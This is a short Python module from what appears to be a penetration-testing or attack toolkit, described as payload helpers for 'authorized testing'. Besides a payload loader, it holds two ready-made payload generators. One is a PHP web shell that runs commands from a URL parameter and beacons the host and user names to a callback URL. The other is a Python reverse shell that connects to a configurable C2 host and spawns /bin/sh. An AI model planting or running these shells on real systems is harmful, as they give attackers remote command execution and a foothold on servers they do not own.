# Made by Sn0w8ird

"""Payload loading helpers — load, template, and prepare payloads for authorized testing."""

from __future__ import annotations

import base64
from typing import Any, Dict


class PayloadHook:
    """Load payload from file or string, prepare for injection."""

    @staticmethod
    def load_payload(payload_source: str, context: Dict[str, Any]) -> str:
        """Load a payload from a file (``@path``), base64 string (``b64:…``), or raw string,
        then substitute ``{key}`` placeholders from *context*. Unknown keys are left as-is."""
        if payload_source.startswith("@"):
            path = payload_source[1:]
            with open(path, encoding="utf-8") as f:
                raw = f.read()
        elif payload_source.startswith("b64:"):
            raw = base64.b64decode(payload_source[4:]).decode()
        else:
            raw = payload_source

        for key, value in context.items():
            raw = raw.replace(f"{{{key}}}", str(value))
        return raw

    @staticmethod
    def get_default_php_webshell(context: Dict[str, Any]) -> str:
        """Generate a minimal PHP webshell with optional C2 callback."""
        return f"""<?php
$cmd = $_GET['c'] ?? $_POST['c'] ?? '';
if ($cmd) {{
    system($cmd);
}}
// Optional beacon
if (isset($_GET['beacon'])) {{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, '{context.get("callback_url", "http://127.0.0.1:8080/beacon")}');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['host' => gethostname(), 'user' => get_current_user()]));
    curl_exec($ch);
    curl_close($ch);
}}
?>"""

    @staticmethod
    def get_default_reverse_shell(context: Dict[str, Any]) -> str:
        """Python reverse shell."""
        return f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{context['c2_host']}",{context['c2_port']}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""

